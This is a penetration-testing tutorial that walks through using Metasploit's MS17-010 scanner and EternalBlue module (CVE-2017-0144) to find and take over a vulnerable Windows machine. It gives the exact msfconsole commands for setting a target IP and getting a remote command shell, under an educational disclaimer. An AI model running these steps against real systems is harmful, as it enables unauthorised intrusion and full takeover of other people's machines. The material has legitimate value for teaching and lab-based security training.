## Introduction

In this article, I will guide you through the process of exploiting a Windows machine using the EternalBlue exploit (CVE-2017-0144) within the Metasploit framework. This exploit allows an attacker to gain remote code execution (RCE) on a vulnerable Windows machine.

### CVE-2017-0144

CVE-2017-0144 is a critical vulnerability in the Windows operating system that enables an attacker to execute arbitrary code on a remote system. This vulnerability was notably exploited by the WannaCry ransomware in 2017, causing widespread damage to organizations worldwide. It affects the SMBv1 protocol in Windows, allowing an attacker to send a specially crafted packet to a vulnerable system and execute arbitrary code.

Although this vulnerability is now considered old, I still remember the significant impact it had at the time. Today, let's explore how we can exploit this vulnerability using Metasploit.

## Disclaimer

This article is for educational purposes only. If you discover a vulnerable system, please report it to the system owner or administrator. Do not use this information for malicious purposes.

## Prerequisites

Before we begin, you need to have the following:

- A vulnerable Windows machine (Windows 7, Windows 8, Windows 10, Windows Server 2008, Windows Server 2012, Windows Server 2016)
- Kali Linux or any other GNU/Linux distribution with Metasploit installed

We assume that you have a strong understanding of ethical hacking and penetration testing concepts.

### Scanning for Vulnerable Machines

Metasploit provides a module to scan for vulnerable machines using the `smb_ms17_010` module. To use this module, follow these steps:

```bash
msfconsole
```

This command will open the Metasploit console. Once you are in the console, use the following command to load the `smb_ms17_010` module:

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Next, set the `RHOSTS` parameter to the IP range you want to scan. For example, to scan the IP address `192.168.0.113`, use the following command:

```bash
set RHOSTS 192.168.0.113
```

Now, initiate the scan by running the following command:

```bash
exploit
```

If the target machine is vulnerable, you will see the output: `Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)`.

### Exploiting the Vulnerability

After identifying a vulnerable machine, you can exploit the vulnerability using the `exploit/windows/smb/ms17_010_eternalblue` module. To use this module, follow these steps:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Next, set the `RHOST` parameter to the IP address of the vulnerable machine. For example, to exploit the IP address `192.168.0.113`, use the following command:

```bash
set RHOST 192.168.0.113
```

Now, exploit the vulnerability by running the following command:

```bash
exploit
```

You should receive a command shell from the Windows machine. You can now execute any command on the target machine, gaining full control over it using CVE-2017-0144.
